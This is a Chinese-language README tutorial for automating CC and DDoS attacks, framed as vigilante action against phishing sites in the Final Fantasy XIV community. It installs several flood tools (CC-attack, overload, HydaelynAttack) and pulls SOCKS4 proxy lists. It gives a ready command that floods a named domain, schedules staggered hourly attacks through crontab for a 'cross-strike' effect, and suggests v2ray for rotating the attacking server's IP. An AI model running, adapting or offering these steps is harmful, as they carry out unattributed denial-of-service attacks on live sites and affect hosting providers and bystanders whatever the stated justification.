# Nyaa:Automata ![](https://img.shields.io/github/stars/NyaaCaster/HydaelynAttack?style=social)
## 菜鸟级CC+DDOS自动打击部署教程

*制作工具是人类于其他动物的区别……但如何使用工具是人和人的区别……*

## 前言

这只是为了维护艾欧泽亚不受钓鱼诈骗网站干涉而定制的自动打击策略，故很多参数写死定向打击特定网站，虽然根据实际情况，有能力编辑者脚本中最好自己维护打击目标，但请不要滥用于其他途径。

## 环境级工具

- [x] Linux
- [x] Python3
- [x] Python3-pip
- [x] [**Leeon123/CC-attack**](https://github.com/Leeon123/CC-attack)
- [x] [**TheSpeedX/PROXY-List**](https://github.com/TheSpeedX/PROXY-List)
- [x] [**7zx/overload**](https://github.com/7zx/overload)
- [x] [**NyaaCaster/HydaelynAttack**](https://github.com/NyaaCaster/HydaelynAttack)

## linunx系统语法注意
- 如果是ubuntu debian系的系统，命令前缀使用 apt
- 如果是centos redhead系的系统，命令前缀使用 yum
- 如果是非root权限账号，请在上述命令前加 sudo

## 安装环境依赖
```shell
apt update -y
apt install git vim zip python3 python3-pip -y
wget https://nyaacaster.github.io/Nyaa-Automata/requirements.txt
python3 -m pip install --upgrade pip
pip3 install -r requirements.txt
```

## 安装CC-attack
```shell
git clone https://github.com/Leeon123/CC-attack.git
```

## 获取Proxy-List的socks4和proxy喂料包
```shell
curl -sSf "https://raw.githubusercontent.com/shiftytr/proxy-list/master/socks4.txt" > socks4.txt
curl -sSf "https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt" > proxy.txt
```
## 安装overload（ddos工具）
```shell
git clone https://github.com/7zx/overload.git
cd overload/
wget https://nyaacaster.github.io/Nyaa-Automata/overload_p.py
cd ..
```
- overload_p.py这个脚本可以自己打开看一下，里面我把手动输入的变量全部写死了以便当自动脚本使用，目标网址可以根据自己情况调整

## 安装HydaelynAttack（ddos工具，流量开销大，每轮攻击12M，计费流量的自己规划好开销）
```shell
git clone https://github.com/NyaaCaster/HydaelynAttack.git
```

## 如果要单独一次性执行cc
```shell
python3 ~/CC-attack/cc.py -url http://liwuhe51.top -f ~/socks4.txt -v 4 -s 30
```
- 命令中地址自己根据情况调整目标网址

## 如果要单独一次性执行overload
```shell
python3 ~/overload/overload_p.py
```
- 自己修改建立了新脚本后执行自己的就可以

## 如果要单独性执行HydaelynAttack
```shell
python3 ~/HydaelynAttack/HydaelynAttack_p.py
```
- HydaelynAttack项目有多个脚本可选，具体看该项目说明


## 部署订制执行计划
```shell
crontab -e
```
- (姑且扫盲一下vim的操作）进入文件后，方向箭移动光标到要修改的地方（这里移动到最末行最末尾）按 i 进入编辑模式

## 插入的计划任务
```shell
0 * * * * python3 ~/CC-attack/cc.py -url http://liwuhe51.top -f ~/socks4.txt -v 4 -s 30
15 * * * * python3 ~/HydaelynAttack/HydaelynAttack_p.py
30 * * * * python3 ~/overload/overload_p.py
```
- 编辑完成后按esc退出编辑
- 英文输入 :qw 保存退出，之后即使重启系统，依然会定时执行
- 时间计划可以自己安排，最好跟我的0 15 30错开，打到交叉打击效果

## 附录：crontab的语法简要说明
```shell
    *    *    *    *    *
    |    |    |    |    |
    |    |    |    |    +----- 星期中星期几 (0 - 6) (星期天 为0)
    |    |    |    +---------- 月份 (1 - 12) 
    |    |    +--------------- 一个月中的第几天 (1 - 31)
    |    +-------------------- 小时 (0 - 23)
    +------------------------- 分钟 (0 - 59)
```

- 每个时间单位的位置都可以写多个值，英文逗号分隔
- 例如：0,5,10 * * * * 这个例子代表每小时的0分 5分 10分各执行一次，合计每小时执行3次
- 更多语法请阅读 [**Linux crontab命令 菜鸟教程**](https://www.runoob.com/linux/linux-comm-crontab.html)（我都看得懂，你一定没问题）

## 如果想便捷的更换打击服务器的ip，可以使用v2ray的linux
-[**v2rayA**](https://v2raya.org/docs/prologue/installation/debian/)
客户端为网页版，可以随时随地访问，不过请自备飞机场

## TODO
- [ ] 把cc打击服务融合到高级触发器中
